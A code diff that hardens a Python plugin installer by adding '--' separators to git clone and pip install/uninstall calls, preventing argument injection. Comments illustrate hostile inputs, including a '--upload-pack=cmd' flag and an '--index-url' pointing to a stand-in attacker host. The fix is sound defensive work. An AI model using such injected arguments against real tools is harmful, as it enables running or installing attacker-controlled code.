@@ -321,8 +321,11 @@ def install_plugin(
             code = 1
         else:
             try:
+                # ``--`` stops git from interpreting a hostile ``spec`` as a
+                # flag (e.g. ``--upload-pack=cmd``). ``_looks_like_git_url``
+                # already gates the prefixes, but defense in depth is cheap.
                 subprocess.run(
-                    ["git", "clone", spec, str(target)],
+                    ["git", "clone", "--", spec, str(target)],
                     check=True, capture_output=True, text=True,
                 )
                 result["installed"] = str(target)
@@ -333,8 +336,12 @@ def install_plugin(
                 code = 1
     else:
         try:
+            # ``--`` separates pip's options from positional package
+            # arguments — without it a malicious ``spec`` like
+            # ``--index-url=http://attacker.example`` would be parsed as
+            # an option rather than a package name.
             proc = subprocess.run(
-                [sys.executable, "-m", "pip", "install", spec],
+                [sys.executable, "-m", "pip", "install", "--", spec],
                 check=True, capture_output=True, text=True,
             )
             result["method"] = "pip_install"
@@ -375,8 +382,11 @@ def uninstall_plugin(
         result["method"] = "directory_remove"
     else:
         try:
+            # ``--`` for the same reason as the install path: keep ``name``
+            # strictly positional even if a future caller forwards a
+            # hyphen-leading string.
             proc = subprocess.run(
-                [sys.executable, "-m", "pip", "uninstall", "-y", name],
+                [sys.executable, "-m", "pip", "uninstall", "-y", "--", name],
                 check=True, capture_output=True, text=True,
             )
             result["method"] = "pip_uninstall"
